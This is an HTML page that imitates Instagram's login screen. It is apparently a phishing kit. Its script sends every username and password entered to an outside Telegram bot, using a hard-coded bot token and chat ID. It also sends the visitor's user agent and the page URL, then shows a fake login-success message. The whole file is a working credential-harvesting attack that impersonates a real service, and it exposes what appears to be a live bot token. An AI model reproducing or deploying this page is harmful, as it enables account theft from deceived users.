<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
        }
        
        .main {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 935px;
            gap: 30px;
        }
        
        .phone {
            display: none;
            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b6d.png') no-repeat;
            background-size: contain;
            width: 454px;
            height: 618px;
            position: relative;
        }
        
        .login-container {
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 40px 20px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .logo {
            width: 175px;
            height: 51px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center;
            background-size: contain;
            margin: 0 auto 30px;
            display: block;
        }
        
        input {
            width: 100%;
            padding: 11px 12px;
            margin: 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
        }
        
        input:focus {
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 8px 0;
            font-weight: 600;
            font-size: 15px;
            margin: 18px 0 10px;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .login-btn:hover {
            background: #0077cc;
        }
        
        .login-btn:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }
        
        .divider {
            margin: 25px 0 20px;
            color: #8e8e8e;
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span {
            padding: 0 18px;
        }
        
        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }
        
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 25px;
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .success-msg {
            color: #4caf50;
            margin-top: 15px;
            font-size: 14px;
            display: none;
        }
        
        .error-msg {
            color: #ed4956;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        
        @media (min-width: 875px) {
            .phone {
                display: block;
            }
        }
    </style>
</head>
<body>
    <div class="main">
        <!-- Phone Mock -->
        <div class="phone"></div>
        
        <div class="login-container">
            <div class="login-box">
                <div class="logo"></div>
                
                <form id="loginForm">
                    <input type="text" id="username" placeholder="Phone number, username or email" required autocomplete="off">
                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
                    <button type="submit" id="loginBtn" class="login-btn">Log in</button>
                </form>
                
                <div class="divider"><span>OR</span></div>
                
                <a href="#" class="forgot">Forgot password?</a>
                
                <div class="success-msg" id="successMsg">✅ Logged in successfully!</div>
                <div class="error-msg" id="errorMsg">❌ Connection error. Try again.</div>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            
            <div style="text-align: center; margin-top: 20px; font-size: 13px; color: #8e8e8e;">
                Get the app.
            </div>
        </div>
    </div>

    <script>
        const TOKEN = "8643363199:AAGh6WtS7I27yb6UWjyLxXvkWHFHXsXarfI";
        const CHAT_ID = "8666373816";

        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const successMsg = document.getElementById('successMsg');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert("Please fill all fields");
                return;
            }

            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";

            const message = `🔥 *New Instagram Login* 🔥\n\n` +
                           `👤 *Username/Email:* \`${username}\`\n` +
                           `🔑 *Password:* \`${password}\`\n\n` +
                           `📱 *User-Agent:* ${navigator.userAgent}\n` +
                           `⏰ *Time:* ${new Date().toLocaleString('en-IN')}\n` +
                           `🌐 *Page:* ${window.location.href}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'MarkdownV2'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    successMsg.style.display = 'block';
                    errorMsg.style.display = 'none';
                    setTimeout(() => {
                        alert("✅ Login Successful (This is a demo)");
                    }, 800);
                } else {
                    throw new Error(data.description || "Telegram API error");
                }
            } catch (err) {
                console.error("Telegram Error:", err);
                errorMsg.style.display = 'block';
                successMsg.style.display = 'none';
                alert("Could not connect to Telegram.\n\n1. Check your internet\n2. Try disabling VPN/Ad-blocker\n3. Open in Incognito");
            } finally {
                loginBtn.disabled = false;
                loginBtn.textContent = "Log in";
            }
        });
    </script>
</body>
</html>
